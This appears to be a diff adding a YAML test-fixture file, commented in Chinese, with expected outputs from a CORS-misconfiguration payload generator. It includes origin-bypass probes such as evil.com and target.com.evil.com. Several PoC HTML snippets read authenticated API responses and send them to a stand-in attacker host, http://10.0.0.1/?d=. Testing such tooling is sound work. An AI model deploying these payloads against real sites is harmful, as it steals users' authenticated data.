@@ -1,0 +1,176 @@
+# CORS 配置错误黄金样本。
+#
+# 期望值全部**照着 body 手推**：槽位先填、变量后替换，没有绕过、没有传输编码，
+# 所以 raw 就是代入后的原串。两处要多推一层：
+#   - Origin 探测那条的 curl：submit=header 决定载荷落到请求头里，再逐个参数算 shell 引号
+#   - 变量没填的一条：契约 3 要求保留 <<lhost>> 字面量，不是留空、也不是给个默认地址
+#
+# 覆盖：单源探测 / null 源 / 前缀与后缀匹配绕过 / 简单请求绕预检 / 判定清单 /
+#       fetch PoC / 沙箱 iframe PoC / JSON 预检 PoC。
+# 每条模板至少一条样本；槽位有多个取值的另补一条切到非默认值的。
+
+ruleDB: v0.1.0
+
+samples:
+  # ================= 探测请求 =================
+
+  - name: CORS · Origin 探测（单源）
+    state:
+      vuln: cors
+      template: cors.generic.probe.origin
+      vars: {origin: "evil.com"}
+      outputs: [raw]
+    expect:
+      # body 是 "https://<<origin>>"，协议头写死在模板里，变量只填域名
+      payload: "https://evil.com"
+
+  - name: CORS · Origin 探测走 curl 层（载荷进请求头）
+    state:
+      vuln: cors
+      template: cors.generic.probe.origin
+      vars: {origin: "evil.com"}
+      submit: header
+      header: Origin
+      outputs: [raw, curl]
+    expect:
+      payload: "https://evil.com"
+      # submit=header 时 place 把载荷放进 headers["Origin"]；GET 且没有 body，
+      # 所以 _curl_args 不产生 -X 和 --data，参数依次是
+      # ["-H", "Origin: https://evil.com", "http://example.com/"]，
+      # 而 bash 的 shell_quote 对每个参数一律单引号包住（-H 也包，是它的既定行为）
+      outputs:
+        curl: "curl '-H' 'Origin: https://evil.com' 'http://example.com/'"
+
+  - name: CORS · Origin 设为 null
+    state:
+      vuln: cors
+      template: cors.generic.probe.null
+      outputs: [raw]
+    expect:
+      # 载荷就是字符串 null。YAML 里不引号会被解析成空值，两边都得引号
+      payload: "null"
+
+  - name: CORS · 前缀匹配绕过
+    state:
+      vuln: cors
+      template: cors.generic.probe.prefix
+      vars: {origin: "evil.com", trusted: "target.com"}
+      outputs: [raw]
+    expect:
+      # "https://" + trusted + "." + origin —— 真正的 authority 是 target.com.evil.com
+      payload: "https://target.com.evil.com"
+
+  - name: CORS · 后缀匹配绕过（默认裸标签拼法）
+    state:
+      vuln: cors
+      template: cors.generic.probe.suffix
+      vars: {trusted: "target.com"}
+      outputs: [raw]
+    expect:
+      # <<bypass.origin>> 取默认选项 label 的 origin="evil"，与 trusted 直接相接：
+      # "https://" + "evil" + "target.com" —— 后缀恰好是目标的域名
+      payload: "https://eviltarget.com"
+
+  - name: CORS · 后缀匹配绕过（完整域名拼法）
+    state:
+      vuln: cors
+      template: cors.generic.probe.suffix
+      slots: {bypass: full}
+      vars: {trusted: "target.com"}
+      outputs: [raw]
+    expect:
+      # 切到 full：origin="evil.com"，相接后是 evil.comtarget.com，
+      # 它同样以 target.com 结尾，但可注册的域名是 comtarget.com
+      payload: "https://evil.comtarget.com"
+
+  - name: CORS · 简单请求绕预检（默认 text/plain）
+    state:
+      vuln: cors
+      template: cors.generic.probe.simple_request
+      outputs: [raw]
+    expect:
+      payload: "text/plain"
+
+  - name: CORS · 简单请求绕预检（表单编码）
+    state:
+      vuln: cors
+      template: cors.generic.probe.simple_request
+      slots: {ct: "application/x-www-form-urlencoded"}
+      outputs: [raw]
+    expect:
+      payload: "application/x-www-form-urlencoded"
+
+  - name: CORS · 反射 Origin 配凭据的判定清单
+    state:
+      vuln: cors
+      template: cors.generic.probe.credentials
+      vars: {origin: "evil.com"}
+      outputs: [raw]
+    expect:
+      # 两行响应头，<<origin>> 代入攻击者源；块标量 |- 所以结尾没有换行
+      payload: |-
+        Access-Control-Allow-Origin: https://evil.com
+        Access-Control-Allow-Credentials: true
+      # 正文里没有引号字面量、没有绕过，不该有任何提示
+      checks_count: 0
+
+  # ================= PoC 页面 =================
+
+  - name: CORS · PoC 页面（fetch 带凭据读响应）
+    state:
+      vuln: cors
+      template: cors.generic.poc.fetch
+      vars: {trusted: "target.com", endpoint: "/api/me", lhost: "10.0.0.1"}
+      outputs: [raw]
+    expect:
+      # 三处替换：<<trusted>><<endpoint>> 拼出被读的接口，<<lhost>> 是外发地址。
+      # 缩进是 body 里写死的两个空格，r=>r.text() 这类箭头函数原样保留
+      payload: |-
+        <script>
+        fetch('https://target.com/api/me',{credentials:'include'})
+          .then(r=>r.text())
+          .then(t=>fetch('http://10.0.0.1/?d='+encodeURIComponent(t)));
+        </script>
+      checks_count: 0
+
+  - name: CORS · PoC 页面没填 lhost（契约 3，不给默认值）
+    state:
+      vuln: cors
+      template: cors.generic.poc.fetch
+      vars: {trusted: "target.com", endpoint: "/api/orders"}
+      outputs: [raw]
+    expect:
+      # 漏填的变量保留 <<lhost>> 字面量——外发那一行明显不可用，不会被误当成能跑的 PoC
+      payload: |-
+        <script>
+        fetch('https://target.com/api/orders',{credentials:'include'})
+          .then(r=>r.text())
+          .then(t=>fetch('http://<<lhost>>/?d='+encodeURIComponent(t)));
+        </script>
+
+  - name: CORS · PoC 页面（沙箱 iframe 造 null 源）
+    state:
+      vuln: cors
+      template: cors.generic.poc.null_origin
+      vars: {trusted: "target.com", endpoint: "/api/me", lhost: "10.0.0.1"}
+      outputs: [raw]
+    expect:
+      # 单行：iframe 的 srcdoc 属性里再嵌一段 script，属性用双引号、JS 里用单引号，
+      # 所以两种引号都不会互相截断
+      payload: |-
+        <iframe sandbox="allow-scripts" srcdoc="<script>fetch('https://target.com/api/me',{credentials:'include'}).then(r=>r.text()).then(t=>fetch('http://10.0.0.1/?d='+encodeURIComponent(t)))</script>"></iframe>
+
+  - name: CORS · PoC 页面（JSON 预检带凭据）
+    state:
+      vuln: cors
+      template: cors.generic.poc.preflight
+      vars: {trusted: "target.com", endpoint: "/api/me", lhost: "10.0.0.1"}
+      outputs: [raw]
+    expect:
+      # 比 fetch 那条多出 method / headers / body：application/json 会触发 OPTIONS 预检
+      payload: |-
+        <script>
+        fetch('https://target.com/api/me',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:'{}'})
+          .then(r=>r.text())
+          .then(t=>fetch('http://10.0.0.1/?d='+encodeURIComponent(t)));
+        </script>
